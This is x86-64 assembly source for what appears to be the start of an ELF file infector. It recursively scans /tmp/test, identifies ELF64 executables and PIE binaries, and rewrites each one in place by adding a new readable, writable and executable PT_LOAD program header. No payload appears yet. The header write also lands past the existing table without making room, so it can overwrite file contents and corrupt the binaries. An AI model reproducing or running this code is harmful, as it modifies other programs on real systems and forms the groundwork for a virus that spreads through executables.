%include "include.s"
%include "print.s"

; Syscall numbers for x86-64
%define SYS_WRITE       1
%define SYS_CLOSE       3
%define SYS_GETDENTS64  217

; Constants
%define AT_FDCWD        -100
%define O_RDONLY        0
%define O_DIRECTORY     0x10000
%define O_RDONLY_DIR    O_RDONLY | O_DIRECTORY
%define DT_DIR          4
%define DT_REG          8
%define STDOUT          1
%define PATH_MAX        4096
%define STACK_LOCALS    128

; Constants for file list storage
%define MAX_FILES       256
%define FILE_ENTRY_SIZE PATH_BUFF_SIZE

section .bss
    path_buffer:    resb PATH_BUFF_SIZE       ; buffer for building full path
    file_list:      resb MAX_FILES * FILE_ENTRY_SIZE  ; storage for file paths
    file_count:     resq 1                    ; number of files stored
    elf_header_buf: resb 64                   ; buffer for reading ELF header
    elf_phdr_buf:   resb ELF64_PHDR_SIZE * MAX_PHDRS  ; buffer for program headers

section .data
    newline:        db 10               ; newline character
    msg_valid:      db " is a valid elf64 executable", 10, 0
    msg_invalid:    db " is not a valid elf64 executable", 10, 0
    msg_add_pt_load: db "add pt_load", 10, 0

section .text
global _start
global list_files_recursive

_start:
    ; Initialize file count to 0
    mov qword [rel file_count], 0
    
    mov rsi, firstDir           ; source = /tmp/test
    lea rdi, [rel path_buffer]  ; destination = path_buffer
    call print_string
    call str_copy
    ; Call list_files_recursive with path_buffer
    lea rdi, [rel path_buffer]
    call list_files_recursive
    
    ; Call check_elf64_exec with the file list
    lea rdi, [rel file_list]
    mov rsi, [rel file_count]
    call check_elf64_exec
    
    jmp _end

; ============================================
; list_files_recursive(char *path)
; rdi = pointer to path string
; Uses stack-allocated buffer for directory entries
; ============================================
list_files_recursive:
    push rbp
    mov rbp, rsp
    
    ; Allocate stack space:
    ; - BUFFER_SIZE bytes for dir_buffer
    ; - STACK_LOCALS bytes for local variables and saved registers
    sub rsp, BUFFER_SIZE + STACK_LOCALS
    and rsp, -16                ; Align stack to 16 bytes

    ; Stack layout:
    ; [rbp-8]   = fd (directory file descriptor)
    ; [rbp-16]  = saved path length
    ; [rbp-24]  = nread (bytes read from getdents64)
    ; [rbp-32]  = current position in buffer
    ; [rbp-40]  = saved r12 (path pointer)
    ; [rbp-48]  = saved r13 (fd)
    ; [rbp-56]  = saved r14 (nread)
    ; [rbp-64]  = saved r15 (dirent pointer)
    ; [rbp-72]  = saved rbx (d_reclen)
    ; [rbp-80]  = saved d_type during path building
    ; [rbp-88]  = saved d_reclen during path building
    ; [rbp - BUFFER_SIZE - 128 ... rbp - 128] = dir_buffer

    mov [rbp-40], r12
    mov [rbp-48], r13
    mov [rbp-56], r14
    mov [rbp-64], r15
    mov [rbp-72], rbx

    ; Save the path pointer
    mov r12, rdi                ; r12 = path

    ; Get the length of the current path
    mov rdi, r12
    call str_len
    mov [rbp-16], rax           ; save path length

    ; Open the directory
    mov eax, SYS_OPENAT         ; sys_openat
    mov edi, AT_FDCWD           ; AT_FDCWD
    mov rsi, r12                ; pathname
    mov edx, O_RDONLY_DIR       ; flags: read-only directory
    xor r10d, r10d              ; mode (not used for opening)
    syscall

    ; Check if open failed
    test rax, rax
    js .done                    ; if fd < 0, exit

    mov [rbp-8], rax            ; save fd
    mov r13, rax                ; r13 = fd

.read_loop:
    ; Call getdents64 - use stack buffer
    mov eax, SYS_GETDENTS64     ; sys_getdents64
    mov edi, r13d               ; fd
    lea rsi, [rbp - BUFFER_SIZE - STACK_LOCALS]   ; buffer on stack
    mov edx, BUFFER_SIZE        ; count
    syscall

    ; Check result
    test rax, rax
    jle .close_dir              ; if nread <= 0, we're done

    mov [rbp-24], rax           ; save nread
    mov qword [rbp-32], 0       ; pos = 0
    mov r14, rax                ; r14 = nread

.process_entry:
    mov rax, [rbp-32]           ; current position
    cmp rax, r14                ; compare with nread
    jge .read_loop              ; if pos >= nread, read more

    ; Get pointer to current dirent (in stack buffer)
    lea r15, [rbp - BUFFER_SIZE - STACK_LOCALS]
    add r15, rax                ; r15 = dirent pointer

    ; Get d_reclen (offset 16, 2 bytes)
    movzx ebx, word [r15 + 16]  ; rbx = d_reclen

    ; Get d_type (at offset 18)
    movzx eax, byte [r15 + 18]  ; eax = d_type

    ; Get d_name pointer (offset 19)
    lea rcx, [r15 + 19]         ; rcx = d_name

    ; Skip "." and ".."
    cmp byte [rcx], '.'
    jne .not_dot
    cmp byte [rcx+1], 0
    je .next_entry              ; skip "."
    cmp byte [rcx+1], '.'
    jne .not_dot
    cmp byte [rcx+2], 0
    je .next_entry              ; skip ".."

.not_dot:
    ; Save d_type and d_reclen on stack
    mov [rbp-80], rax           ; save d_type
    mov [rbp-88], rbx           ; save d_reclen

    ; Build full path: path = original_path + "/" + d_name
    mov rdi, r12                ; destination = path (our working path)
    mov rax, [rbp-16]           ; original path length
    add rdi, rax                ; point to end of original path

    ; Add "/" if needed
    cmp byte [rdi-1], '/'
    je .no_slash
    mov byte [rdi], '/'
    inc rdi

.no_slash:
    ; Append d_name (rcx still points to d_name)
    mov rsi, rcx                ; source = d_name
    call str_copy

    ; Restore d_type
    mov rax, [rbp-80]           ; restore d_type

    ; Check if it's a regular file (DT_REG = 8)
    cmp al, DT_REG
    jne .check_dir

    ; Check if we have room for more files (bounds checking)
    mov rax, [rel file_count]
    cmp rax, MAX_FILES
    jge .skip_store             ; skip if file_list is full

    ; Store the file path in file_list
    ; Calculate destination: file_list + (file_count * FILE_ENTRY_SIZE)
    imul rax, FILE_ENTRY_SIZE
    lea rdi, [rel file_list]
    add rdi, rax                ; destination = file_list[file_count]
    mov rsi, r12                ; source = current path
    call str_copy
    
    ; Increment file count
    mov rax, [rel file_count]
    inc rax
    mov [rel file_count], rax

.skip_store:
    ; Print the full path
    mov rdi, r12                ; path
    call print_string
    
    ; Print newline
    push rax
    mov eax, SYS_WRITE
    mov edi, STDOUT
    lea rsi, [rel newline]
    mov edx, 1
    syscall
    pop rax
    jmp .restore_path

.check_dir:
    ; Check if it's a directory (DT_DIR = 4)
    cmp al, DT_DIR
    jne .restore_path

    ; Recurse into directory
    mov rdi, r12
    call list_files_recursive

.restore_path:
    ; Restore the original path by truncating at saved length
    mov rax, [rbp-16]           ; original path length
    mov byte [r12 + rax], 0     ; null terminate

    ; Restore d_reclen to rbx for next_entry calculation
    mov rbx, [rbp-88]

.next_entry:
    ; Move to next entry
    mov rax, [rbp-32]           ; current pos
    add rax, rbx                ; add d_reclen
    mov [rbp-32], rax           ; update pos
    jmp .process_entry

.close_dir:
    ; Close the directory
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

.done:
    ; Restore saved registers
    mov r12, [rbp-40]
    mov r13, [rbp-48]
    mov r14, [rbp-56]
    mov r15, [rbp-64]
    mov rbx, [rbp-72]

    mov rsp, rbp
    pop rbp
    ret

; ============================================
; str_len(char *str) -> rax = length
; rdi = pointer to null-terminated string
; ============================================
str_len:
    push rdi
    xor rax, rax
.loop:
    cmp byte [rdi], 0
    je .done
    inc rdi
    inc rax
    jmp .loop
.done:
    pop rdi
    ret

; ============================================
; str_copy(char *dest, char *src)
; rdi = destination
; rsi = source
; Copies src to dest including null terminator
; Returns original destination pointer
; ============================================
str_copy:
    push rdi
.loop:
    lodsb                       ; load byte from [rsi] into al, inc rsi
    stosb                       ; store al to [rdi], inc rdi
    test al, al
    jnz .loop
    pop rax                     ; return original dest in rax
    ret

; ============================================
; check_elf64_exec(char *file_list, uint64_t count)
; rdi = pointer to file list (each entry is FILE_ENTRY_SIZE bytes)
; rsi = number of files in the list
; Checks each file and prints if it's a valid ELF64 executable
; ============================================
check_elf64_exec:
    push rbp
    mov rbp, rsp
    push r12                    ; saved file list pointer
    push r13                    ; saved file count
    push r14                    ; current file index
    push r15                    ; current file path pointer
    push rbx                    ; saved for later use

    mov r12, rdi                ; r12 = file_list base
    mov r13, rsi                ; r13 = total file count
    xor r14, r14                ; r14 = current index = 0

.check_loop:
    cmp r14, r13                ; if index >= count, done
    jge .check_done

    ; Calculate current file path: r15 = file_list + (index * FILE_ENTRY_SIZE)
    mov rax, r14
    imul rax, FILE_ENTRY_SIZE
    lea r15, [r12 + rax]        ; r15 = current file path

    ; Open the file for reading
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r15                ; pathname
    xor edx, edx                ; O_RDONLY = 0
    xor r10d, r10d
    syscall

    ; Check if open failed
    test rax, rax
    js .invalid_file            ; if fd < 0, mark as invalid

    mov rbx, rax                ; save fd in rbx

    ; Read the first 64 bytes (ELF header)
    mov eax, SYS_READ
    mov edi, ebx                ; fd
    lea rsi, [rel elf_header_buf]
    mov edx, 64                 ; read 64 bytes (Ehdr size)
    syscall

    ; Check if we read enough bytes
    cmp rax, 64
    jl .close_and_invalid

    ; Check ELF magic: 0x7f 'E' 'L' 'F'
    lea rdi, [rel elf_header_buf]
    cmp byte [rdi + 0], 0x7f
    jne .close_and_invalid
    cmp byte [rdi + 1], 'E'
    jne .close_and_invalid
    cmp byte [rdi + 2], 'L'
    jne .close_and_invalid
    cmp byte [rdi + 3], 'F'
    jne .close_and_invalid

    ; Check ELF class (offset 4): must be 2 for 64-bit
    cmp byte [rdi + 4], 2       ; ELFCLASS64 = 2
    jne .close_and_invalid

    ; Check e_type (offset 16): must be 2 for executable (ET_EXEC)
    ; or 3 for shared object (ET_DYN) which can also be an executable
    movzx eax, word [rdi + 16]  ; e_type is at offset 16 in ELF header
    cmp ax, 2                   ; ET_EXEC = 2
    je .valid_elf
    cmp ax, 3                   ; ET_DYN = 3 (PIE executables)
    je .valid_elf
    jmp .close_and_invalid

.valid_elf:
    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, ebx
    syscall

    ; Print filename
    mov rdi, r15
    call print_string

    ; Print " is a valid elf64 executable\n"
    lea rdi, [rel msg_valid]
    call print_string

    ; Call add_pt_load for this valid ELF64 executable
    mov rdi, r15                ; pass the file path
    call add_pt_load

    jmp .next_file

.close_and_invalid:
    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, ebx
    syscall

.invalid_file:
    ; Print filename
    mov rdi, r15
    call print_string

    ; Print " is not a valid elf64 executable\n"
    lea rdi, [rel msg_invalid]
    call print_string

.next_file:
    inc r14                     ; index++
    jmp .check_loop

.check_done:
    pop rbx
    pop r15
    pop r14
    pop r13
    pop r12
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; add_pt_load(char *filepath)
; rdi = pointer to file path
; Adds a PT_LOAD segment to the ELF file
; Modifies ELF header (e_phnum) and adds a new program header
; ============================================
add_pt_load:
    push rbp
    mov rbp, rsp
    push r12                    ; saved file path
    push r13                    ; saved file descriptor
    push r14                    ; saved e_phoff
    push r15                    ; saved e_phnum
    push rbx                    ; saved e_phentsize

    mov r12, rdi                ; r12 = file path

    ; Open the file for read/write
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r12                ; pathname
    mov edx, O_RDWR             ; flags: read-write
    xor r10d, r10d
    syscall

    ; Check if open failed
    test rax, rax
    js .add_pt_load_fail        ; if fd < 0, fail

    mov r13, rax                ; r13 = fd

    ; Read the ELF header (64 bytes)
    mov eax, SYS_READ
    mov edi, r13d               ; fd
    lea rsi, [rel elf_header_buf]
    mov edx, 64                 ; read 64 bytes
    syscall

    ; Check if we read enough bytes
    cmp rax, 64
    jl .add_pt_load_close_fail

    ; Get e_phoff (program header table offset) from ELF header at offset 32
    lea rdi, [rel elf_header_buf]
    mov r14, [rdi + e_phoff]    ; r14 = e_phoff

    ; Get e_phnum (number of program headers) from ELF header at offset 56
    movzx r15d, word [rdi + e_phnum]  ; r15 = e_phnum

    ; Get e_phentsize (size of each program header entry) from ELF header at offset 54
    movzx ebx, word [rdi + e_phentsize]  ; rbx = e_phentsize

    ; Seek to the program header table
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    mov rsi, r14                ; offset = e_phoff
    xor edx, edx                ; SEEK_SET = 0
    syscall

    test rax, rax
    js .add_pt_load_close_fail

    ; Read all existing program headers
    mov eax, SYS_READ
    mov edi, r13d               ; fd
    lea rsi, [rel elf_phdr_buf]
    ; Calculate total size: e_phnum * e_phentsize
    mov rax, r15                ; e_phnum
    imul rax, rbx               ; * e_phentsize
    mov rdx, rax                ; read size
    syscall

    ; Check if we read enough bytes
    mov rax, r15
    imul rax, rbx
    ; (skip size check for now, just proceed)

    ; Increment e_phnum in the ELF header buffer
    lea rdi, [rel elf_header_buf]
    inc word [rdi + e_phnum]

    ; Create new PT_LOAD program header at the end of the phdr buffer
    ; New phdr offset = e_phnum * e_phentsize (before increment, so use r15)
    mov rax, r15                ; original e_phnum
    imul rax, rbx               ; * e_phentsize
    lea rdi, [rel elf_phdr_buf]
    add rdi, rax                ; rdi = pointer to new phdr

    ; Initialize the new PT_LOAD segment
    ; p_type = PT_LOAD (1)
    mov dword [rdi + p_type], PT_LOAD

    ; p_flags = PF_R | PF_W | PF_X (readable, writable, executable)
    mov dword [rdi + p_flags], PF_R | PF_W | PF_X

    ; p_offset = 0 (for simplicity, start of file)
    mov qword [rdi + p_offset], 0

    ; p_vaddr = 0 (will be set by loader)
    mov qword [rdi + p_vaddr], 0

    ; p_paddr = 0
    mov qword [rdi + p_paddr], 0

    ; p_filesz = PT_LOAD_FILESZ (from include.s)
    mov qword [rdi + p_filesz], PT_LOAD_FILESZ

    ; p_memsz = PT_LOAD_MEMSZ (from include.s)
    mov qword [rdi + p_memsz], PT_LOAD_MEMSZ

    ; p_align = 0x1000 (4KB alignment)
    mov qword [rdi + p_align], 0x1000

    ; Seek back to beginning of file to write the ELF header
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    xor esi, esi                ; offset = 0
    xor edx, edx                ; SEEK_SET = 0
    syscall

    test rax, rax
    js .add_pt_load_close_fail

    ; Write the modified ELF header
    mov eax, SYS_WRITE
    mov edi, r13d               ; fd
    lea rsi, [rel elf_header_buf]
    mov edx, 64                 ; write 64 bytes
    syscall

    cmp rax, 64
    jl .add_pt_load_close_fail

    ; Seek to the program header table
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    mov rsi, r14                ; offset = e_phoff
    xor edx, edx                ; SEEK_SET = 0
    syscall

    test rax, rax
    js .add_pt_load_close_fail

    ; Write all program headers including the new one
    mov eax, SYS_WRITE
    mov edi, r13d               ; fd
    lea rsi, [rel elf_phdr_buf]
    ; Calculate total size: (original e_phnum + 1) * e_phentsize
    mov rax, r15                ; original e_phnum
    inc rax                     ; + 1 for new phdr
    imul rax, rbx               ; * e_phentsize
    mov rdx, rax                ; write size
    syscall

    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

    ; Print success message
    lea rdi, [rel msg_add_pt_load]
    call print_string

    jmp .add_pt_load_done

.add_pt_load_close_fail:
    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

.add_pt_load_fail:
    ; No success message printed on failure

.add_pt_load_done:
    pop rbx
    pop r15
    pop r14
    pop r13
    pop r12
    mov rsp, rbp
    pop rbp
    ret

_end:
  mov rdi, the_end
  call print_string
  mov eax, 60                 ; sys_exit
  xor edi, edi                ; status = 0
  syscall
